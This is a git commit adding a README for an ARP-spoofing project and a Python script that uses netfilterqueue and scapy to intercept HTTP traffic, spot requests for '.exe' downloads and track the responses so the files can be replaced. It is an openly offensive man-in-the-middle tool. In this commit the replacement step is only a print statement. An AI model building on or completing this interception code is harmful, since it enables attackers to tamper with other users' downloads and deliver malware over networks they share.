8966f7ba2a2938fc51a1bcf70783bbb8cb532f32
mthwbrwn <mthwbrwn@gmail.com>
2019-06-25 06:03:57 -0700

    first commit

---
+++ README.md
@@ -0,0 +1,2 @@
+# ARP_spoofer
+A short program used to spoof the ARP tables using scapy 
---
+++ file_interceptor.py
@@ -0,0 +1,25 @@
+#!/usr/bin/env python
+
+import netfilterqueue
+import scapy.all as scapy
+
+ack_list = []
+def process_packet(packet):
+    scapy_packet = scapy.IP(packet.get_payload())
+    if scapy_packet.haslayer(scapy.Raw):
+        if scapy_packet[scapy.TCP].dport == 80:
+            if '.exe' in scapy_packet[scapy.Raw].load:
+                print('\n[+] exe Request\n')
+                ack_list.append(scapy_packet[scapy.TCP].ack)
+                print (scapy_packet.show())
+        elif scapy_packet[scapy.TCP].sport == 80:
+            if scapy_packet[scapy.TCP].seq in ack_list:
+                print('replacing .exe file')
+                print (scapy_packet.show())
+
+    packet.accept()
+
+queue = netfilterqueue.NetfilterQueue()
+queue.bind(0, process_packet)
+
+queue.run()
